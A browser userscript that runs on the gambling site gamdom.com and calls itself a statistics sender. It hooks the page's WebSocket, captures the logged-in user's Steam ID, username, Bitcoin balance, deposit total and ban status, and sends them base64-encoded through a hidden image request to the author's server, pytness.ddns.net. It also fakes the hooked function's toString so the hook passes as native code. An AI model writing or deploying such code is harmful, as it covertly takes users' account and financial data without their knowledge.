// ==UserScript==
// @name         GN DataSender
// @description  Sends the userdata to a database for statistics purposes
// @version      1.0
// @author       Pytness
// @match        *://gamdom.com/*
// @run-at       document-start
// @grant        unsafeWindow
// ==/UserScript==

// https://cdn.rawgit.com/Pytness/Gamdom-Notify/de4d01b8/lib/userdata_sender.js

(function(w) {

    function send(u) {
        if (typeof u !== 'object' || u === null) return true;
        var user = {};
        var keys = [
            'id','steamid','username',
            'name_promotion','userclass','xp',
            'balanceSatoshis','total_deposited', 'banned'
        ];

        for (let i = 0; i < keys.length; i++) {
            let k = keys[i];
            user[k] = u[k];
        }

        var image = new Image();
        image.src = 'https://pytness.ddns.net/logdata.py?q=' + btoa(JSON.stringify(user));
        w.document.head.appendChild(image);

        return false;
    }

    var extractData = (a, b=false) => {
        try {
            b = JSON.parse(a.split(',').slice(1).join(','));
        } finally {return b;}
    };

    var manageData_EL = (a) => { // Event Listener
        var b = extractData(a.data);
        if (b[0] == 'initialize' &&
            typeof b[1].user == 'object' && b[1].user !== null) {

            if(send(b[1].user)) return;
            this.removeEventListener('message', manageData_EL);
        }
    };

    var _WS = w.WebSocket;
    w.WebSocket = function(...args) {
        var tws = new _WS(...args);
        tws.addEventListener('message', manageData_EL, false);
        return tws;
    };

    w.WebSocket.prototype = _WS.prototype;

    w.WebSocket.__defineGetter__('toString', () => function() {
        return _WS.toString;
    });
    
}(unsafeWindow));
